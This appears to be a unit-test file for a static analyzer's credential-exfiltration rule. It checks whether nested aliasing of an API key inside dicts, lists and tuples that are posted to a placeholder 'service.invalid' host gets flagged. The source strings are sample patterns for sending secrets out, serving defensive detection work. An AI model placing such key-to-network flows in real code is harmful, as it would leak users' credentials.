"""Nested object references: source strings are parsed, never executed."""
import unittest
from test_qindun_certify import MODULE

CASE_TEMPLATES = [
    ["dict_child_write","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":{}}\n__BINDING__\nalias[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields)\n","fields[\"child\"]",["confirmed"]],
    ["list_child_append","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":[]}\n__BINDING__\nalias.append(key)\nrequests.post(\"https://service.invalid\",json=fields)\n","fields[\"child\"]",["confirmed"]],
    ["set_child_add","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":{1}}\n__BINDING__\nalias.add(key)\nrequests.post(\"https://service.invalid\",json=fields)\n","fields[\"child\"]",["confirmed"]],
    ["get_existing_child","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":{}}\n__BINDING__\nalias[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields)\n","fields.get(\"child\")",["confirmed"]],
    ["sibling_stays_public","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"left\":{},\"right\":{}}\n__BINDING__\nalias[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields[\"right\"])\n","fields[\"left\"]",[]],
    ["preexisting_child_inserted","import os,requests\nkey=os.getenv(\"API_KEY\")\nleaf={}\nfields={\"child\":leaf}\n__BINDING__\nalias[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields)\n","leaf",["confirmed"]],
    ["same_child_in_two_parents","import os,requests\nkey=os.getenv(\"API_KEY\")\nleaf={}\nfields={\"left\":leaf,\"right\":leaf}\n__BINDING__\nalias[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields[\"right\"])\n","fields[\"left\"]",["confirmed"]],
    ["replaced_child_detaches_old_alias","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":{}}\n__BINDING__\nfields[\"child\"]={}\nalias[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields)\n","fields[\"child\"]",[]],
    ["rebound_alias_leaves_parent","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":{}}\n__BINDING__\nalias={\"payload\":key}\nrequests.post(\"https://service.invalid\",json=fields)\n","fields[\"child\"]",[]],
    ["immutable_child_rebind","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":\"public\"}\n__BINDING__\nalias+=key\nrequests.post(\"https://service.invalid\",json=fields)\n","fields[\"child\"]",[]],
    ["selected_public_ignores_sibling_secret","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":\"public\",\"secret\":key}\n__BINDING__\nrequests.post(\"https://service.invalid\",json=alias)\n","fields[\"child\"]",[]],
    ["selected_secret_child","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":{\"secret\":key}}\n__BINDING__\nrequests.post(\"https://service.invalid\",json=alias)\n","fields[\"child\"]",["confirmed"]],
    ["existing_get_ignores_secret_default","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":\"public\"}\n__BINDING__\nrequests.post(\"https://service.invalid\",json=alias)\n","fields.get(\"child\",key)",[]],
    ["missing_default_is_not_inserted","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={}\n__BINDING__\nalias[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields)\n","fields.get(\"absent\",{})",[]],
    ["list_element_child","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields=[{}]\n__BINDING__\nalias[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields)\n","fields[0]",["confirmed"]],
    ["tuple_element_mutable_child","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields=({},)\n__BINDING__\nalias[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields)\n","fields[0]",["confirmed"]],
    ["two_level_child","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":{\"inner\":{}}}\n__BINDING__\nalias[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields)\n","fields[\"child\"][\"inner\"]",["confirmed"]],
    ["returned_child_identity","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":{}}\ndef select(value):\n    return value[\"child\"]\n__BINDING__\nalias[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields)\n","select(fields)",["confirmed"]],
    ["helper_mutates_extracted_child","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":{}}\ndef change(value):\n    value[\"payload\"]=key\n__BINDING__\nchange(alias)\nrequests.post(\"https://service.invalid\",json=fields)\n","fields[\"child\"]",["confirmed"]],
    ["conditional_child_mutation","import os,requests\nkey=os.getenv(\"API_KEY\")\nfields={\"child\":{}}\n__BINDING__\nif enabled:\n    alias[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields)\n","fields[\"child\"]",["confirmed"]],
]


class PythonNestedIdentityTests(unittest.TestCase):
    def test_nested_identity_contracts(self):
        for name, template, expression, expected in CASE_TEMPLATES:
            for binding in (
                f"alias={expression}",
                f"alias:object={expression}",
                f"alias,unused=({expression},None)",
            ):
                with self.subTest(case=name, binding=binding):
                    hits, error = MODULE._python_flow_findings(
                        "main.py", template.replace("__BINDING__", binding)
                    )
                    self.assertIsNone(error)
                    self.assertEqual(sorted({hit.disposition for hit in hits
                        if hit.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"}), expected)

    def test_graph_boundaries(self):
        cases = [
            ["exact_overwrite","fields={\"payload\":key}\nfields[\"payload\"]=\"public\"\nrequests.post(\"https://service.invalid\",json=fields)\n",[],False],
            ["shallow_dict_copy_child","child={}\nfields={\"child\":child}\ncopy=dict(fields)\ncopy[\"child\"][\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields)\n",["confirmed"],False],
            ["shallow_dict_copy_replacement","child={}\nfields={\"child\":child}\ncopy=dict(fields)\ncopy[\"child\"]={\"payload\":key}\nrequests.post(\"https://service.invalid\",json=fields)\n",[],False],
            ["extend_dictionary_uses_keys","fields=[]\nfields.extend({\"public\":key})\nrequests.post(\"https://service.invalid\",json=fields)\n",[],False],
            ["unknown_extend_preserves_existing_child","child={}\nfields=[child]\nfields.extend(unknown)\nchild[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields)\n",["confirmed"],False],
            ["fresh_conditional_return","def make():\n    if enabled:\n        return {\"public\":\"one\"}\n    return {\"public\":\"two\"}\nfields=make()\nrequests.post(\"https://service.invalid\",json=fields)\n",[],False],
            ["fresh_return_shared_child","child={}\ndef make():\n    if enabled:\n        return {\"child\":child}\n    return {\"child\":child}\nfields=make()\nfields[\"child\"][\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=child)\n",["confirmed"],False],
            ["cyclic_graph","fields={}\nfields[\"self\"]=fields\nrequests.post(\"https://service.invalid\",json=fields)\n",[],True],
            ["unknown_key_partial","fields={\"public\":\"text\"}\nfields[name]=key\nrequests.post(\"https://service.invalid\",json=fields)\n",["confirmed"],True],
            ["mutable_augmented_child","child=[]\nfields={\"child\":child}\nalias=fields[\"child\"]\nfields[\"child\"] += [key]\nrequests.post(\"https://service.invalid\",json=alias)\n",["confirmed"],False],
            ["name_augmented_child","fields={\"child\":[]}\nalias=fields[\"child\"]\nalias += [key]\nrequests.post(\"https://service.invalid\",json=fields[\"child\"][0])\n",["confirmed"],False],
            ["mixed_auth_and_payload","fields={\"Authorization\":key,\"public\":\"text\"}\nrequests.get(\"https://service.invalid\",headers=fields)\nfields[\"payload\"]=key\nrequests.post(\"https://service.invalid\",json=fields)\n",["candidate","confirmed"],False],
        ]
        for name, body, expected, partial in cases:
            with self.subTest(case=name):
                hits, error = MODULE._python_flow_findings(
                    "main.py", 'import os,requests\nkey=os.getenv("API_KEY")\n' + body
                )
                self.assertEqual(error is not None, partial)
                self.assertEqual(sorted({hit.disposition for hit in hits
                    if hit.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"}), expected)
